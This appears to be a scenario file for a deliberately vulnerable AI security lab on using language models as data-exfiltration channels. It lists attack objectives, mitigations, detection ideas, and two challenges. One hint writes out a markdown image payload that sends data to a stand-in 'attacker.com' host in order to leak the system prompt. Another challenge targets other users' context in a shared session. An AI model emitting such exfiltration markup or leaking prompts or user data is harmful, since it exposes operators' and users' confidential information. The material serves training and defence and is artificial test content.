name: AI Data Exfiltration
description: Exploit AI systems as data exfiltration channels. Demonstrate how LLMs can be weaponized to leak sensitive data through covert channels including markdown rendering, URL generation, model outputs, and side-channel inference from model behavior.
author: DVAP Research Team
objectives: Exfiltrate user data through LLM-generated URLs
Use markdown image rendering as a covert exfiltration channel
Extract training data through memorization probing
Exploit model output to encode and exfiltrate context window contents
Demonstrate side-channel inference from model response timing
attack_surface: LLM generating URLs or external references
Context window visible to model during generation
mitigations: Sanitize and block external URL generation
Content Security Policy restricting markdown rendering
Output scanning for PII and sensitive patterns
Training data deduplication and memorization mitigation
detection_opportunities: Monitor outbound requests triggered by model outputs
Alert on PII patterns in model responses
Log and inspect URL generation events
Detect encoded data patterns in model output

architecture.data_flow: User prompt -> Context assembly -> LLM generation -> Markdown render -> UI display
trust_boundaries: Model output is untrusted before display
Markdown rendering is a code execution boundary

threat_model.impact: PII disclosure, context window exfiltration, sensitive data leak
threat_model.likelihood: High in chat applications with markdown rendering and external network access

challenges.name: The Invisible Request
challenges.description: Craft a prompt that causes the model to generate a markdown image that exfiltrates the system prompt to your server.
hints: ![img](https://attacker.com/?data=...) triggers an HTTP request when rendered
Ask the model to include the system prompt as a URL parameter

challenges.name: Window Shopping
challenges.description: Extract the full contents of another user's conversation context that has been injected into a shared model session.
hints: The shared session model maintains context from multiple users
Careful prompt construction can surface adjacent context
